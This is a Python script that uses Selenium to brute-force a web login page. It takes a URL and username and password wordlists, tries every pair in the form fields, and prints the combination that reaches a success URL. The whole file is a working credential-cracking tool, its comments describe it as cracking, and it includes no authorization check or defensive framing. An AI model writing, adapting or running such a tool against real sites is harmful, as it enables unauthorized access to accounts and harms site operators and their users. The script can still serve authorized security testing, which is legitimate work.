import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Configuration
WAIT_TIME = 10  # Adjust this value as needed
URL = input('[+] Enter Page URL: ')
USERNAME_FILE = input('[+] Enter Username List: ')
PASSWORD_FILE = input('[+] Enter Password List: ')

# Initialize the WebDriver instance (Chrome in this case)
def setup_driver():
    return webdriver.Chrome()

# Locate and return login elements
def find_login_elements(driver):
    driver.get(URL)
    username_field = WebDriverWait(driver, WAIT_TIME).until(
        EC.presence_of_element_located((By.ID, 'username'))
    )
    password_field = WebDriverWait(driver, WAIT_TIME).until(
        EC.presence_of_element_located((By.ID, 'password'))
    )
    login_button = WebDriverWait(driver, WAIT_TIME).until(
        EC.presence_of_element_located((By.XPATH, "//button[contains(@class, 'btn-outline-primary') and contains(@class, 'm-2')]"))
    )
    return username_field, password_field, login_button

# Perform login attempt using provided username and password
def attempt_login(username, password, driver):
    username_field, password_field, login_button = find_login_elements(driver)
    username_field.clear()
    username_field.send_keys(username)
    password_field.clear()
    password_field.send_keys(password)
    login_button.click()
    time.sleep(2)

# Iterate through username and password lists and attempt to crack the login
def cracking(username_list, password_list, driver):
    for username in username_list:
        for password in password_list:
            username = username.strip()
            password = password.strip()
            print(f'Trying Username: {username} with Password: {password}')

            attempt_login(username, password, driver)

            # Replace '<success-login-url>' with your actual successful login URL
            if '<success-login-url>' in driver.current_url:
                # This line checks for a successful login based on the URL.
                print(f'[+] Found Username: ==> {username}')
                print(f'[+] Found Password: ==> {password}')
                return True

    return False

# Main function to run the script
def main():
    driver = setup_driver()
    try:
        with open(USERNAME_FILE, 'r') as usernames, open(PASSWORD_FILE, 'r') as passwords:
            username_list = usernames.readlines()
            password_list = passwords.readlines()
            combination_found = cracking(username_list, password_list, driver)
            if combination_found:
                print('[+] Combination Found')
            else:
                print('[!] Username and Password Combination Not Found')
    finally:
        driver.quit()

if __name__ == '__main__':
    main()
